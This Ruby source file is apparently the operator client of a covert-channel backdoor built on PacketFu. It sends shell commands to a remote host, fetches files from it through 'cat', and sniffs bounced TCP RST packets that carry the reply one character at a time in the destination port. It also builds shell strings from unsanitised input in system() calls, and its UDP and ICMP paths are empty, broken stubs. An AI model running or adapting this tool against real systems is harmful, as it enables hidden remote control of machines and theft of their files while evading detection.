require 'packetfu'

require File.expand_path(File.join(File.dirname(__FILE__), 'cipher.rb'))
require File.expand_path(File.join(File.dirname(__FILE__), 'packetizer.rb'))

include PacketFu

class Client
  def initialize(iface, tos, addr, pass, port = nil)
    @conn = Connector.new(iface, tos, addr, pass, "client", port)
    @tos = tos
    @conn.sendAddr
  end

  def start
     puts "started"


    while (true)
     puts "write a command or prepend 'dl ' to your command to get a file"
      str = STDIN.gets
      if str[0,3] == "dl "
        @conn.cliSend("cat " + str[3..-1])
        array = str[3..-1].split("/")
        fn = array[array.length - 1]
        system("rm -f #{fn}")
        puts fn
        t = Thread.new{ readPackets(fn) }
      else
        @conn.cliSend(str)
        t = Thread.new{ readPackets() }
      end
      t.join

      puts "Command Sent"

    end
  end

private

  def readPackets(dl = nil)
    while(true)
      case @tos
        when "icmp"
          icmp(dl)
        when "tcp"
          tcp(dl)
        when "udp"
          udp(dl)
        else
          abort("Client::readPackets @tos not initialized")
      end
    end
  end

  def tcp(dl = nil)
  puts "using tcp to receive"
    filter = "tcp and tcp[13] & 4!=0 and src #{$tcpBounceIp}"
    cap = Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => filter)
    cap.stream.each do |p|
      pkt = Packet.parse p
      if pkt.is_tcp?
        puts "packet Recieved"
        if (pkt.tcp_dst == 2560)
          puts "final packet"
          STDOUT.flush
          return
        end
        char = (pkt.tcp_dst >> 8).chr
        if (dl.nil?)
          print char
        else
          system("echo -ne #{char} >> #{dl}")
        end
      end
    end
  end

  def udp
  end

  def icmp
  end


end
